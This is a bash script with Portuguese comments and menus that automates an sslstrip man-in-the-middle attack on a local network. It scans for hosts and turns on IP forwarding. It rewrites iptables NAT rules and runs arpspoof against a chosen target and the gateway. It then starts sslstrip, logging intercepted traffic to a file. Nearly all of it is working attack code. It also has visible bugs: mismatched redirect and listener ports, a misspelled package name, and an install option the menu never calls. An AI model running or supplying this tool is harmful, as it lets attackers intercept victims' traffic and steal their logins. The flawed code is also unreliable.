#!/bin/bash
# Script para automatizar o ataque sslstrip
# Data: 12-07-2016
#
# Pacotes requeridos: sslstrip, dsniff e xterm
#
# Autor: Joao Lucas <joaolucas@linuxmail.org>
#

DATA=$(date +'%d-%m-%Y-%H-%M')
PREFIX=/home/jsouza/
ARQ=cap_$DATA.log

menu(){
	echo "########################MENU##############################"
	echo "1. Identificar gateway"
	echo "2. Identificar target"
	echo "3. Iniciar"
	echo "4. Instalar dependências(Debian de devirados)"
	echo "99. Sair"
	read -p "> Opção: " opt
	
	case $opt in
		1) get_router ;;
		2) scan_target ;;
		3) iniciar_ataque ;;
		99) exit 0 ;;
		*) echo "Opção Invalida!" ; menu ;;
	esac
}

get_router(){
	ip_router=$(route -n | awk '{print $2}' | grep [1-9])
	if [ $? -eq 0 ]
	then
		echo "> GATEWAY: $ip_router"
		sleep 3
		menu
	else
		echo "[ FALHA ] Ocorreram erros!"
		sleep 2
		exit 0
	fi
}

scan_target(){
	REDE=$(route | awk '{print $1}' | grep 0$)
	nmap -Pn -T3 $REDE/24 > scan_hosts.txt 2> /dev/null
	if [ $? -eq 0 ]	
	then
		echo "[ OK ] Esses foram os hosts encontrados!"
		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | less	
		echo "> Escolha o alvo."
		menu
	else
		echo "[ FALHA ] Ocorreram erros em encontrar os hosts"
		sleep 2
		exit 0
	fi
}

iniciar_ataque(){ 
	echo "> Ativando o ip forward"
	echo 1 > /proc/sys/net/ipv4/ip_forward
	echo "> Limpando regras da tabela NAT do iptables"
	iptables -t nat -F
	echo "> Redirecionando o trafego da porta 80 para 1000"
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
	if [ $? -eq 0 ]
	then
		echo "[ OK ] Regras criadas com sucesso!"	
 		read -p "> TARGET: " ip_target
		read -p "> GATEWAY: " ip_router
		nohup xterm -e "arpspoof -i eth0 $ip_router -t $ip_target" &
		nohup xterm -e "arpspoof -i eth0 -t $ip_target $ip_router" &
		echo "> Iniciando o sslstrip..."
		echo "> Salvando em: $ARQ"	
		nohup xterm -e "sslstrip -l 10000 -w $ARQ 2> /dev/null" &
		sleep 1
	else
		echo "[ FALHA ] Ocorreram erros em criar regras."
		sleep 2
		exit 0
	fi
	tail -f $ARQ
}

install_req(){
	echo "> Essa opção só esta disponivel para debian e derivados"
	apt-get install dnsiff sslstrip xterm
	if [ $? -eq 0 ]
	then
		echo "[ OK ]Os pacotes necessários foram instalados!"
	else
		echo "[ FALHA ] Os pacotes não foram encontrados."
	fi
}

while true
do
	if [ $UID -eq 0 ]
	then
		echo "O autor não se responsabiliza por qualquer ato feito com má fé utilizando esse script" 
		menu
	else
		echo "Execute o script como root!"
		sleep 3
		exit 0
	fi
done
